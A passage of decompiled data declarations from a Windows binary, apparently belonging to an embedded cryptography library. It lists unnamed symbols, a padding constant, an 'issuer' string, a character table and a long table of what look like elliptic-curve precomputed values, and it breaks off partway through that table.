_UNKNOWN unk_1400F8850; // weak
_UNKNOWN unk_1400F88B0; // weak
_UNKNOWN unk_1400F8910; // weak
_UNKNOWN unk_1400F8970; // weak
_UNKNOWN unk_1400F89D0; // weak
_UNKNOWN unk_1400F8A30; // weak
_UNKNOWN unk_1400F8A90; // weak
_UNKNOWN unk_1400F8AF0; // weak
_UNKNOWN unk_1400F8BE0; // weak
_UNKNOWN unk_1400F8C40; // weak
__int128 xmmword_1400F8CA0 = 0x36363636363636363636363636363636i64; // weak
__int128 xmmword_1400F8CB0 = 0x6A6A6A6A6A6A6A6A6A6A6A6A6A6A6A6Ai64; // weak
_UNKNOWN unk_1400F8CC0; // weak
_UNKNOWN unk_1400F8D20; // weak
_UNKNOWN unk_1400F8D80; // weak
_UNKNOWN unk_1400F8DE0; // weak
_UNKNOWN unk_1400F8E40; // weak
_UNKNOWN unk_1400F8EA0; // weak
_UNKNOWN unk_1400F8F00; // weak
_UNKNOWN unk_1400F8F60; // weak
_UNKNOWN unk_1400F8FC0; // weak
_UNKNOWN unk_1400F9020; // weak
_UNKNOWN unk_1400F9130; // weak
_UNKNOWN unk_1400F9190; // weak
_UNKNOWN unk_1400F91F0; // weak
_UNKNOWN unk_1400F9250; // weak
_UNKNOWN unk_1400F92B0; // weak
_UNKNOWN unk_1400F9310; // weak
_UNKNOWN unk_1400F9370; // weak
_UNKNOWN unk_1400F93D0; // weak
_UNKNOWN unk_1400F9430; // weak
_UNKNOWN unk_1400F9490; // weak
_UNKNOWN unk_1400F94F0; // weak
_UNKNOWN unk_1400F9550; // weak
_UNKNOWN unk_1400F95B0; // weak
_UNKNOWN unk_1400F9610; // weak
_UNKNOWN unk_1400F9670; // weak
_UNKNOWN unk_1400F96D0; // weak
_UNKNOWN unk_1400F9730; // weak
_UNKNOWN unk_1400F9790; // weak
_UNKNOWN unk_1400F97F0; // weak
_UNKNOWN unk_1400F9850; // weak
_UNKNOWN unk_1400F98B0; // weak
_UNKNOWN unk_1400F9910; // weak
_UNKNOWN unk_1400F9970; // weak
_UNKNOWN unk_1400F99D0; // weak
_UNKNOWN unk_1400F9A30; // weak
_UNKNOWN unk_1400F9A90; // weak
_UNKNOWN unk_1400F9AF0; // weak
_UNKNOWN unk_1400F9B50; // weak
_UNKNOWN unk_1400F9BB0; // weak
_UNKNOWN unk_1400F9C10; // weak
_UNKNOWN unk_1400F9C70; // weak
_UNKNOWN unk_1400F9CD0; // weak
_UNKNOWN unk_1400F9D30; // weak
_UNKNOWN unk_1400F9D90; // weak
_UNKNOWN unk_1400F9DF0; // weak
_UNKNOWN unk_1400F9E50; // weak
_UNKNOWN unk_1400F9EB0; // weak
_UNKNOWN unk_1400F9F10; // weak
_UNKNOWN unk_1400F9F70; // weak
_UNKNOWN unk_1400F9FD0; // weak
_UNKNOWN unk_1400FA030; // weak
_UNKNOWN unk_1400FA090; // weak
_UNKNOWN unk_1400FA0F0; // weak
_UNKNOWN unk_1400FA150; // weak
_UNKNOWN unk_1400FA1B0; // weak
_UNKNOWN unk_1400FA230; // weak
_UNKNOWN unk_1400FA290; // weak
_UNKNOWN unk_1400FA2F0; // weak
_UNKNOWN unk_1400FA350; // weak
_UNKNOWN unk_1400FA3B0; // weak
_UNKNOWN unk_1400FA410; // weak
_UNKNOWN unk_1400FA470; // weak
_UNKNOWN unk_1400FA4D0; // weak
_UNKNOWN unk_1400FA530; // weak
_UNKNOWN unk_1400FA590; // weak
_UNKNOWN unk_1400FA5F0; // weak
_UNKNOWN unk_1400FA650; // weak
_UNKNOWN unk_1400FA6B0; // weak
_UNKNOWN unk_1400FA710; // weak
_UNKNOWN unk_1400FA770; // weak
_UNKNOWN unk_1400FA7D0; // weak
_UNKNOWN unk_1400FA830; // weak
_UNKNOWN unk_1400FA890; // weak
_UNKNOWN unk_1400FA8F0; // weak
_UNKNOWN unk_1400FA950; // weak
_UNKNOWN unk_1400FA9B0; // weak
_UNKNOWN unk_1400FAA40; // weak
char byte_1400FAA98[16] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
_UNKNOWN unk_1400FAAE0; // weak
_UNKNOWN unk_1400FAB40; // weak
_UNKNOWN unk_1400FABA0; // weak
_UNKNOWN unk_1400FAC00; // weak
_UNKNOWN unk_1400FAC60; // weak
_UNKNOWN unk_1400FACB0; // weak
_UNKNOWN unk_1400FAD00; // weak
_UNKNOWN unk_1400FAD50; // weak
_UNKNOWN unk_1400FADA0; // weak
_UNKNOWN unk_1400FADF0; // weak
_UNKNOWN unk_1400FAE40; // weak
_UNKNOWN unk_1400FAE90; // weak
_UNKNOWN unk_1400FAEE0; // weak
_UNKNOWN unk_1400FAF30; // weak
_UNKNOWN unk_1400FAF80; // weak
_UNKNOWN unk_1400FAFD0; // weak
_UNKNOWN unk_1400FB020; // weak
__int128 xmmword_1400FB200 = 0x3000000020000000100000000i64; // weak
_UNKNOWN unk_1400FB2B0; // weak
_UNKNOWN unk_1400FB3F0; // weak
_UNKNOWN unk_1400FB480; // weak
_UNKNOWN unk_1400FB590; // weak
_UNKNOWN unk_1400FB6F0; // weak
_UNKNOWN unk_1400FB860; // weak
char aIssuer_0[7] = "issuer"; // weak
_WORD word_1400FB910[128] =
{
  1026,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  2,
  120,
  0,
  1,
  40,
  0,
  0,
  0,
  16,
  1040,
  1040,
  -31744,
  25,
  25,
  16400,
  8208,
  16,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  16,
  9,
  9,
  16,
  9,
  16,
  0,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  0,
  1025,
  0,
  0,
  0,
  0,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  4112,
  0,
  0,
  0,
  0,
  2
}; // weak
char a0123456789abcd_3[17] = "0123456789ABCDEF"; // weak
char byte_1400FBA28[32] =
{
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\0',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\xFF',
  '\x01',
  '\x01',
  '\x01',
  '\xFF',
  '\x01',
  '\x01',
  '\x01',
  '\xFF',
  '\x01',
  '\xFF',
  '\x04',
  '\xFF',
  '\x02',
  '\0'
}; // weak
_UNKNOWN unk_140105E70; // weak
_UNKNOWN unk_140105F60; // weak
_UNKNOWN unk_1401060D0; // weak
_UNKNOWN unk_140106160; // weak
_UNKNOWN unk_140106228; // weak
_UNKNOWN unk_1401062C0; // weak
_UNKNOWN unk_140106360; // weak
_UNKNOWN unk_1401063D0; // weak
_UNKNOWN unk_140106460; // weak
_UNKNOWN unk_140106550; // weak
_UNKNOWN unk_1401065E0; // weak
_UNKNOWN unk_140106690; // weak
_UNKNOWN unk_140106940; // weak
_UNKNOWN unk_140106AB0; // weak
_UNKNOWN unk_140106B90; // weak
_DWORD dword_140106C20[7680] =
{
  25967493,
  -14356035,
  29566456,
  3660896,
  -12694345,
  4014787,
  27544626,
  -11754271,
  -6079156,
  2047605,
  -12545711,
  934262,
  -2722910,
  3049990,
  -727428,
  9406986,
  12720692,
  5043384,
  19500929,
  -15469378,
  -8738181,
  4489570,
  9688441,
  -14785194,
  10184609,
  -12363380,
  29287919,
  11864899,
  -24514362,
  -4438546,
  -12815894,
  -12976347,
  -21581243,
  11784320,
  -25355658,
  -2750717,
  -11717903,
  -3814571,
  -358445,
  -10211303,
  -21703237,
  6903825,
  27185491,
  6451973,
  -29577724,
  -9554005,
  -15616551,
  11189268,
  -26829678,
  -5319081,
  26966642,
  11152617,
  32442495,
  15396054,
  14353839,
  -12752335,
  -3128826,
  -9541118,
  -15472047,
  -4166697,
  15636291,
  -9688557,
  24204773,
  -7912398,
  616977,
  -16685262,
  27787600,
  -14772189,
  28944400,
  -1550024,
  16568933,
  4717097,
  -11556148,
  -1102322,
  15682896,
  -11807043,
  16354577,
  -11775962,
  7689662,
  11199574,
  30464156,
  -5976125,
  -11779434,
  -15670865,
  23220365,
  15915852,
  7512774,
  10017326,
  -17749093,
  -9920357,
  -17036878,
  13921892,
  10945806,
  -6033431,
  27105052,
  -16084379,
  -28926210,
  15006023,
  3284568,
  -6276540,
  23599295,
  -8306047,
  -11193664,
  -7687416,
  13236774,
  10506355,
  7464579,
  9656445,
  13059162,
  10374397,
  7798556,
  16710257,
  3033922,
  2874086,
  28997861,
  2835604,
  32406664,
  -3839045,
  -641708,
  -101325,
  10861363,
  11473154,
  27284546,
  1981175,
  -30064349,
  12577861,
  32867885,
  14515107,
  -15438304,
  10819380,
  4708026,
  6336745,
  20377586,
  9066809,
  -11272109,
  6594696,
  -25653668,
  12483688,
  -12668491,
  5581306,
  19563160,
  16186464,
  -29386857,
  4097519,
  10237984,
  -4348115,
  28542350,
  13850243,
  -23678021,
  -15815942,
  -15371964,
  -12862754,
  32573250,
  4720197,
  -26436522,
  5875511,
  -19188627,
  -15224819,
  -9818940,
  -12085777,
  -8549212,
  109983,
  15149363,
  2178705,
  22900618,
  4543417,
  3044240,
  -15689887,
  1762328,
  14866737,
  -18199695,
  -15951423,
  -10473290,
  1707278,
  -17185920,
  3916101,
  -28236412,
  3959421,
  27914454,
  4383652,
  5153746,
  9909285,
  1723747,
  -2777874,
  30523605,
  5516873,
  19480852,
  5230134,
  -23952439,
  -15175766,
  -30269007,
  -3463509,
  7665486,
  10083793,
  28475525,
  1649722,
  20654025,
  16520125,
  30598449,
  7715701,
  28881845,
  14381568,
  9657904,
  3680757,
  -20181635,
  7843316,
  -31400660,
  1370708,
  29794553,
  -1409300,
  14499471,
  -2729599,
  -33191113,
  -4254652,
  28494862,
  14271267,
  30290735,
  10876454,
  -33154098,
  2381726,
  -7195431,
  -2655363,
  -14730155,
  462251,
  -27724326,
  3941372,
  -6236617,
  3696005,
  -32300832,
  15351955,
  27431194,
  8222322,
  16448760,
  -3907995,
  -18707002,
  11938355,
  -32961401,
  -2970515,
  29551813,
  10109425,
  -13657040,
  -13155431,
  -31283750,
  11777098,
  21447386,
  6519384,
  -2378284,
  -1627556,
  10092783,
  -4764171,
  27939166,
  14210322,
  4677035,
  16277044,
  -22964462,
  -12398139,
  -32508754,
  12005538,
  -17810127,
  12803510,
  17228999,
  -15661624,
  -1233527,
  300140,
  -1224870,
  -11714777,
  30364213,
  -9038194,
  18016357,
  4397660,
  -10958843,
  -7690207,
  4776341,
  -14954238,
  27850028,
  -15602212,
  -26619106,
  14544525,
  -17477504,
  982639,
  29253598,
  15796703,
  -2863982,
  -9908884,
  10057023,
  3163536,
  7332899,
  -4120128,
  -21047696,
  9934963,
  5793303,
  16271923,
  -24131614,
  -10116404,
  29188560,
  1206517,
  -14747930,
  4559895,
  -30123922,
  -10897950,
  -27643952,
  -11493006,
  16282657,
  -11036493,
  28414021,
  -15012264,
  24191034,
  4541697,
  -13338309,
  5500568,
  12650548,
  -1497113,
  9052871,
  11355358,
  -17680037,
  -8400164,
  -17430592,
  12264343,
  10874051,
  13524335,
  25556948,
  -3045990,
  714651,
  2510400,
  23394682,
  -10415330,
  33119038,
  5080568,
  -22528059,
  5376628,
  -26088264,
  -4011052,
  -17013699,
  -3537628,
  -6726793,
  1920897,
  -22321305,
  -9447443,
  4535768,
  1569007,
  -2255422,
  14606630,
  -21692440,
  -8039818,
  28430649,
  8775819,
  -30494562,
  3044290,
  31848280,
  12543772,
  -22028579,
  2943893,
  -31857513,
  6777306,
  13784462,
  -4292203,
  -27377195,
  -2062731,
  7718482,
  14474653,
  2385315,
  2454213,
  -22631320,
  46603,
  -4437935,
  -15680415,
  656965,
  -7236665,
  24316168,
  -5253567,
  13741529,
  10911568,
  -33233417,
  -8603737,
  -20177830,
  -1033297,
  33040651,
  -13424532,
  -20729456,
  8321686,
  21060490,
  -2212744,
  15712757,
  -4336099,
  1639040,
  10656336,
  23845965,
  -11874838,
  -9984458,
  608372,
  -13672732,
  -15087586,
  -10889693,
  -7557059,
  -6036909,
  11305547,
  1123968,
  -6780577,
  27229399,
  23887,
  -23244140,
  -294205,
  -11744728,
  14712571,
  -29465699,
  -2029617,
  12797024,
  -6440308,
  -1633405,
  16678954,
  -29500620,
  4770662,
  -16054387,
  14001338,
  7830047,
  9564805,
  -1508144,
  -4795045,
  -17169265,
  4904953,
  24059557,
  14617003,
  19037157,
  -15039908,
  19766093,
  -14906429,
  5169211,
  16191880,
  2128236,
  -4326833,
  -16981152,
  4124966,
  -8540610,
  -10653797,
  30336522,
  -14105247,
  -29806336,
  916033,
  -6882542,
  -2986532,
  -22630907,
  12419372,
  -7134229,
  -7473371,
  -16478904,
  16739175,
  285431,
  2763829,
  15736322,
  4143876,
  2379352,
  11839345,
  -4110402,
  -5988665,
  11274298,
  794957,
  212801,
  -14594663,
  23527084,
  -16458268,
  33431127,
  -11130478,
  -17838966,
  -15626900,
  8909499,
  8376530,
  -32625340,
  4087881,
  -15188911,
  -14416214,
  1767683,
  7197987,
  -13205226,
  -2022635,
  -13091350,
  448826,
  5799055,
  4357868,
  -4774191,
  -16323038,
  6721966,
  13833823,
  -23523388,
  -1551314,
  26354293,
  -11863321,
  23365147,
  -3949732,
  7390890,
  2759800,
  4409041,
  2052381,
  23373853,
  10530217,
  7676779,
  -12885954,
  21302353,
  -4264057,
  1244380,
  -12919645,
  -4421239,
  7169619,
  4982368,
  -2957590,
  30256825,
  -2777540,
  14086413,
  9208236,
  15886429,
  16489664,
  1996075,
  10375649,
  14346367,
  13311202,
  -6874135,
  -16438411,
  -13693198,
  398369,
  -30606455,
  -712933,
  -25307465,
  9795880,
  -2777414,
  14878809,
  -33531835,
  14780363,
  13348553,
  12076947,
  -30836462,
  5113182,
  -17770784,
  11797796,
  31950843,
  13929123,
  -25888302,
  12288344,
  -30341101,
  -7336386,
  13847711,
  5387222,
  -18582163,
  -3416217,
  17824843,
  -2340966,
  22744343,
  -10442611,
  8763061,
  3617786,
  -19600662,
  10370991,
  20246567,
  -14369378,
  22358229,
  -543712,
  18507283,
  -10413996,
  14554437,
  -8746092,
  32232924,
  16763880,
  9648505,
  10094563,
  26416693,
  14745928,
  -30374318,
  -6472621,
  11094161,
  15689506,
  3140038,
  -16510092,
  -16160072,
  5472695,
  31895588,
  4744994,
  8823515,
  10365685,
  -27224800,
  9448613,
  -28774454,
  366295,
  19153450,
  11523972,
  -11096490,
  -6503142,
  -24647631,
  5420647,
  28344573,
  8041113,
  719605,
  11671788,
  8678025,
  2694440,
  -6808014,
  2517372,
  4964326,
  11152271,
  -15432916,
  -15266516,
  27000813,
  -10195553,
  -15157904,
  7134312,
  8639287,
  -2814877,
  -7235688,
  10421742,
  564065,
  5336097,
  6750977,
  -14521026,
  11836410,
  -3979488,
  26297894,
  16080799,
  23455045,
  15735944,
  1695823,
  -8819122,
  8169720,
  16220347,
  -18115838,
  8653647,
  17578566,
  -6092619,
  -8025777,
  -16012763,
  -11144307,
  -2627664,
  -5990708,
  -14166033,
  -23308498,
  -10968312,
  15213228,
  -10081214,
  -30853605,
  -11050004,
  27884329,
  2847284,
  2655861,
  1738395,
  -27537433,
  -14253021,
  -25336301,
  -8002780,
  -9370762,
  8129821,
  21651608,
  -3239336,
  -19087449,
  -11005278,
  1533110,
  3437855,
  23735889,
  459276,
  29970501,
  11335377,
  26030092,
  5821408,
  10478196,
  8544890,
  32173121,
  -16129311,
  24896207,
  3921497,
  22579056,
  -3410854,
  19270449,
  12217473,
  17789017,
  -3395995,
  -30552961,
  -2228401,
  -15578829,
  -10147201,
  13243889,
  517024,
  15479401,
  -3853233,
  30460520,
  1052596,
  -11614875,
  13323618,
  32618793,
  8175907,
  -15230173,
  12596687,
  27491595,
  -4612359,
  3179268,
  -9478891,
  31947069,
  -14366651,
  -4640583,
  -15339921,
  -15125977,
  -6039709,
  -14756777,
  -16411740,
  19072640,
  -9511060,
  11685058,
  11822410,
  3158003,
  -13952594,
  33402194,
  -4165066,
  5977896,
  -5215017,
  473099,
  5040608,
  -20290863,
  8198642,
  -27410132,
  11602123,
  1290375,
  -2799760,
  28326862,
  1721092,
  -19558642,
  -3131606,
  7881532,
  10687937,
  7578723,
  7738378,
  -18951012,
  -2553952,
  21820786,
  8076149,
  -27868496,
  11538389,
  -19935666,
  3899861,
  18283497,
  -6801568,
  -15728660,
  -11249211,
  8754525,
  7446702,
  -5676054,
  5797016,
  -11295600,
  -3793569,
  -15782110,
  -7964573,
  12708869,
  -8456199,
  2014099,
  -9050574,
  -2369172,
  -5877341,
  -22472376,
  -11568741,
  -27682020,
  1146375,
  18956691,
  16640559,
  1192730,
  -3714199,
  15123619,
  10811505,
  14352098,
  -3419715,
  -18942044,
  10822655,
  32750596,
  4699007,
  -70363,
  15776356,
  -28886779,
  -11974553,
  -28241164,
  -8072475,
  -4978962,
  -5315317,
  29416931,
  1847569,
  -20654173,
  -16484855,
  4714547,
  -9600655,
  15200332,
  8368572,
  19679101,
  15970074,
  -31872674,
  1959451,
  24611599,
  -4543832,
  -11745876,
  12340220,
  12876937,
  -10480056,
  33134381,
  6590940,
  -6307776,
  14872440,
  9613953,
  8241152,
  15370987,
  9608631,
  -4143277,
  -12014408,
  8446281,
  -391603,
  4407738,
  13629032,
  -7724868,
  15866074,
  -28210621,
  -8814099,
  26660628,
  -15677655,
  8393734,
  358047,
  -7401291,
  992988,
  -23904233,
  858697,
  20571223,
  8420556,
  14620715,
  13067227,
  -15447274,
  8264467,
  14106269,
  15080814,
  33531827,
  12516406,
  -21574435,
  -12476749,
  236881,
  10476226,
  57258,
  -14677024,
  6472998,
  2466984,
  17258519,
  7256740,
  8791136,
  15069930,
  1276410,
  -9371918,
  22949635,
  -16322807,
  -23493039,
  -5702186,
  14711875,
  4874229,
  -30663140,
  -2331391,
  5855666,
  4990204,
  -13711848,
  7294284,
  -7804282,
  1924647,
  -1423175,
  -7912378,
  -33069337,
  9234253,
  20590503,
  -9018988,
  31529744,
  -7352666,
  -2706834,
  10650548,
  31559055,
  -11609587,
  18979186,
  13396066,
  24474287,
  4968103,
  22267082,
  4407354,
  24063882,
  -8325180,
  -18816887,
  13594782,
  33514650,
  7021958,
  -11566906,
  -6565505,
  -21365085,
  15928892,
  -26158305,
  4315421,
  -25948728,
  -3916677,
  -21480480,
  12868082,
  -28635013,
  13504661,
  19988037,
  -2132761,
  21078225,
  6443208,
  -21446107,
  2244500,
  -12455797,
  -8089383,
  -30595528,
  13793479,
  -5852820,
  319136,
  -25723172,
  -6263899,
  33086546,
  8957937,
  -15233648,
  5540521,
  -11630176,
  -11503902,
  -8119500,
  -7643073,
  2620056,
  1022908,
  -23710744,
  -1568984,
  -16128528,
  -14962807,
  23152971,
  775386,
  27395463,
  14006635,
  -9701118,
  4649512,
  1689819,
  892185,
  -11513277,
  -15205948,
  9770129,
  9586738,
  26496094,
  4324120,
  1556511,
  -3550024,
  27453819,
  4763127,
  -19179614,
  5867134,
  -32765025,
  1927590,
  31726409,
  -4753295,
  23962434,
  -16019500,
  27846559,
  5931263,
  -29749703,
  -16108455,
  27461885,
  -2977536,
  22380810,
  1815854,
  -23033753,
  -3031938,
  7283490,
  -15148073,
  -19526700,
  7734629,
  -8010264,
  -9590817,
  -11120403,
  6196038,
  29344158,
  -13430885,
  7585295,
  -3176626,
  18549497,
  15302069,
  -32658337,
  -6171222,
  -7672793,
  -11051681,
  6258878,
  13504381,
  10458790,
  -6418461,
  -8872242,
  8424746,
  24687205,
  8613276,
  -30667046,
  -3233545,
  1863892,
  -1830544,
  19206234,
  7134917,
  -11284482,
  -828919,
  11334899,
  -9218022,
  8025293,
  12707519,
  17523892,
  -10476071,
  10243738,
  -14685461,
  -5066034,
  16498837,
  8911542,
  6887158,
  -9584260,
  -6958590,
  11145641,
  -9543680,
  17303925,
  -14124238,
  6536641,
  10543906,
  -28946384,
  15479763,
  -17466835,
  568876,
  -1497683,
  11223454,
  -2669190,
  -16625574,
  -27235709,
  8876771,
  -25742899,
  -12566864,
  -15649966,
  -846607,
  -33026686,
  -796288,
  -33481822,
  15824474,
  -604426,
  -9039817,
  10330056,
  70051,
  7957388,
  -9002667,
  9764902,
  15609756,
  27698697,
  -4890037,
  1657394,
  3084098,
  10477963,
  -7470260,
  12119566,
  -13250805,
  29016247,
  -5365589,
  31280319,
  14396151,
  -30233575,
  15272409,
  -12288309,
  3169463,
  28813183,
  16658753,
  25116432,
  -5630466,
  -25173957,
  -12636138,
  -25014757,
  1950504,
  -26180358,
  9489187,
  11053416,
  -14746161,
  -31053720,
  5825630,
  -8384306,
  -8767532,
  15341279,
  8373727,
  28685821,
  7759505,
  -14378516,
  -12002860,
  -31971820,
  4079242,
  298136,
  -10232602,
  -2878207,
  15190420,
  -32932876,
  13806336,
  -14337485,
  -15794431,
  -24004620,
  10940928,
  8669718,
  2742393,
  -26033313,
  -6875003,
  -1580388,
  -11729417,
  -25979658,
  -11445023,
  -17411874,
  -10912854,
  9291594,
  -16247779,
  -12154742,
  6048605,
  -30305315,
  14843444,
  1539301,
  11864366,
  20201677,
  1900163,
  13934231,
  5128323,
  11213262,
  9168384,
  -26280513,
  11007847,
  19408960,
  -940758,
  -18592965,
  -4328580,
  -5088060,
  -11105150,
  20470157,
  -16398701,
  -23136053,
  9282192,
  14855179,
  -15390078,
  -7362815,
  -14408560,
  -22783952,
  14461608,
  14042978,
  5230683,
  29969567,
  -2741594,
  -16711867,
  -8552442,
  9175486,
  -2468974,
  21556951,
  3506042,
  -5933891,
  -12449708,
  -3144746,
  8744661,
  19704003,
  4581278,
  -20430686,
  6830683,
  -21284170,
  8971513,
  -28539189,
  15326563,
  -19464629,
  10110288,
  -17262528,
  -3503892,
  -23500387,
  1355669,
  -15523050,
  15300988,
  -20514118,
  9168260,
  -5353335,
  4488613,
  -23803248,
  16314347,
  7780487,
  -15638939,
  -28948358,
  9601605,
  33087103,
  -9011387,
  -19443170,
  -15512900,
  -20797467,
  -12445323,
  -29824447,
  10229461,
  -27444329,
  -15000531,
  -5996870,
  15664672,
  23294591,
  -16632613,
  -22650781,
  -8470978,
  27844204,
  11461195,
  13099750,
  -2460356,
  18151676,
  13417686,
  -24722913,
  -4176517,
  -31150679,
  5988919,
  -26858785,
  6685065,
  1661597,
  -12551441,
  15271676,
  -15452665,
  11433042,
  -13228665,
  8239631,
  -5279517,
  -1985436,
  -725718,
  -18698764,
  2167544,
  -6921301,
  -13440182,
  -31436171,
  15575146,
  30436815,
  12192228,
  -22463353,
  9395379,
  -9917708,
  -8638997,
  12215110,
  12028277,
  14098400,
  6555944,
  23007258,
  5757252,
  -15427832,
  -12950502,
  30123440,
  4617780,
  -16900089,
  -655628,
  -4026201,
  -15240835,
  11893168,
  13718664,
  -14809462,
  1847385,
  -15819999,
  10154009,
  23973261,
  -12684474,
  -26531820,
  -3695990,
  -1908898,
  2534301,
  -31870557,
  -16550355,
  18341390,
  -11419951,
  32013174,
  -10103539,
  -25479301,
  10876443,
  -11771086,
  -14625140,
  -12369567,
  1838104,
  21911214,
  6354752,
  4425632,
  -837822,
  -10433389,
  -14612966,
  22229858,
  -3091047,
  -13191166,
  776729,
  -17415375,
  -12020462,
  4725005,
  14044970,
  19268650,
  -7304421,
  1555349,
  8692754,
  -21474059,
  -9910664,
  6347390,
  -1411784,
  -19522291,
  -16109756,
  -24864089,
  12986008,
  -10898878,
  -5558584,
  -11312371,
  -148526,
  19541418,
  8180106,
  9282262,
  10282508,
  -26205082,
  4428547,
  -8661196,
  -13194263,
  4098402,
  -14165257,
  15522535,
  8372215,
  5542595,
  -10702683,
  -10562541,
  14895633,
  26814552,
  -16673850,
  -17480754,
  -2489360,
  -2781891,
  6993761,
  -18093885,
  10114655,
  -20107055,
  -929418,
  31422704,
  10427861,
  -7110749,
  6150669,
  -29091755,
  -11529146,
  25953725,
  -106158,
  -4234397,
  -8039292,
  -9119125,
  3046000,
  2101609,
  -12607294,
  19390020,
  6094296,
  -3315279,
  12831125,
  -15998678,
  7578152,
  5310217,
  14408357,
  -33548620,
  -224739,
  31575954,
  6326196,
  7381791,
  -2421839,
  -20902779,
  3296811,
  24736065,
  -16328389,
  18374254,
  7318640,
  6295303,
  8082724,
  -15362489,
  12339664,
  27724736,
  2291157,
  6088201,
  -14184798,
  1792727,
  5857634,
  13848414,
  15768922,
  25091167,
  14856294,
  -18866652,
  8331043,
  24373479,
  8541013,
  -701998,
  -9269457,
  12927300,
  -12695493,
  -22182473,
  -9012899,
  -11423429,
  -5421590,
  11632845,
  3405020,
  30536730,
  -11674039,
  -27260765,
  13866390,
  30146206,
  9142070,
  3924129,
  -15307516,
  -13817122,
  -10054960,
  12291820,
  -668366,
  -27702774,
  9326384,
  -8237858,
  4171294,
  -15921940,
  16037937,
  6713787,
  16606682,
  -21612135,
  2790944,
  26396185,
  3731949,
  345228,
  -5462949,
  -21327538,
  13448259,
  25284571,
  1143661,
  20614966,
  -8849387,
  2031539,
  -12391231,
  -16253183,
  -13582083,
  31016211,
  -16722429,
  26371392,
  -14451233,
  -5027349,
  14854137,
  17477601,
  3842657,
  28012650,
  -16405420,
  -5075835,
  9368966,
  -8562079,
  -4600902,
  -15249953,
  6970560,
  -9189873,
  16292057,
  -8867157,
  3507940,
  29439664,
  3537914,
  23333589,
  6997794,
  -17555561,
  -11018068,
  -15209202,
  -15051267,
  -9164929,
  6580396,
  -12185861,
  -7679788,
  16438269,
  10826160,
  -8696817,
  -6235611,
  17860444,
  -9273846,
  -2095802,
  9304567,
  20714564,
  -4336911,
  29088195,
  7406487,
  11426967,
  -5095705,
  14792667,
  -14608617,
  5289421,
  -477127,
  -16665533,
  -10650790,
  -6160345,
  -13305760,
  9192020,
  -1802462,
  17271490,
  12349094,
  26939669,
  -3752294,
  -12889898,
  9373458,
  31595848,
  16374215,
  21471720,
  13221525,
  -27283495,
  -12348559,
  -3698806,
  117887,
  22263325,
  -6560050,
  3984570,
  -11174646,
  -15114008,
  -566785,
  28311253,
  5358056,
  -23319780,
  541964,
  16259219,
  3261970,
  2309254,
  -15534474,
  -16885711,
  -4581916,
  24134070,
  -16705829,
  -13337066,
  -13552195,
  9378160,
  -13140186,
  -22845982,
  -12745264,
  28198281,
  -7244098,
  -2399684,
  -717351,
  690426,
  14876244,
  24977353,
  -314384,
  -8223969,
  -13465086,
  28432343,
  -1176353,
  -13068804,
  -12297348,
  -22380984,
  6618999,
  -1538174,
  11685646,
  12944378,
  13682314,
  -24389511,
  -14413193,
  8044829,
  -13817328,
  32239829,
  -5652762,
  -18603066,
  4762990,
  -926250,
  8885304,
  -28412480,
  -3187315,
  9781647,
  -10350059,
  32779359,
  5095274,
  -33008130,
  -5214506,
  -32264887,
  -3685216,
  9460461,
  -9327423,
  -24601656,
  14506724,
  21639561,
  -2630236,
  -16400943,
  -13112215,
  25239338,
  15531969,
  3987758,
  -4499318,
  -1289502,
  -6863535,
  17874574,
  558605,
  -13600129,
  10240081,
  9171883,
  16131053,
  -20869254,
  9599700,
  33499487,
  5080151,
  2085892,
  5119761,
  -22205145,
  -2519528,
  -16381601,
  414691,
  -25019550,
  2170430,
  30634760,
  -8363614,
  -31999993,
  -5759884,
  -6845704,
  15791202,
  8550074,
  -1312654,
  29928809,
  -12092256,
  27534430,
  -7192145,
  -22351378,
  12961482,
  -24492060,
  -9570771,
  10368194,
  11582341,
  -23397293,
  -2245287,
  16533930,
  8206996,
  -30194652,
  -5159638,
  -11121496,
  -3382234,
  2307366,
  6362031,
  -135455,
  8868177,
  -16835630,
  7031275,
  7589640,
  8945490,
  -32152748,
  8917967,
  6661220,
  -11677616,
  -1192060,
  -15793393,
  7251489,
  -11182180,
  24099109,
  -14456170,
  5019558,
  -7907470,
  4244127,
  -14714356,
  -26933272,
  6453165,
  -19118182,
  -13289025,
  -6231896,
  -10280736,
  10853594,
  10721687,
  26480089,
  5861829,
  -22995819,
  1972175,
  -1866647,
  -10557898,
  -3363451,
  -6441124,
  -17002408,
  5906790,
  221599,
  -6563147,
  7828208,
  -13248918,
  24362661,
  -2008168,
  -13866408,
  7421392,
  8139927,
  -6546497,
  32257646,
  -5890546,
  30375719,
  1886181,
  -21175108,
  15441252,
  28826358,
  -4123029,
  6267086,
  9695052,
  7709135,
  -16603597,
  -32869068,
  -1886135,
  14795160,
  -7840124,
  13746021,
  -1742048,
  28584902,
  7787108,
  -6732942,
  -15050729,
  22846041,
  -7571236,
  -3181936,
  -363524,
  4771362,
  -8419958,
  24949256,
  6376279,
  -27466481,
  -8174608,
  -18646154,
  -9930606,
  33543569,
  -12141695,
  3569627,
  11342593,
  26514989,
  4740088,
  27912651,
  3697550,
  19331575,
  -11472339,
  6809886,
  4608608,
  7325975,
  -14801071,
  -11618399,
  -14554430,
  -24321212,
  7655128,
  -1369274,
  5214312,
  -27400540,
  10258390,
  -17646694,
  -8186692,
  11431204,
  15823007,
  26570245,
  14329124,
  18029990,
  4796082,
  -31446179,
  15580664,
  9280358,
  -3973687,
  -160783,
  -10326257,
  -22855316,
  -4304997,
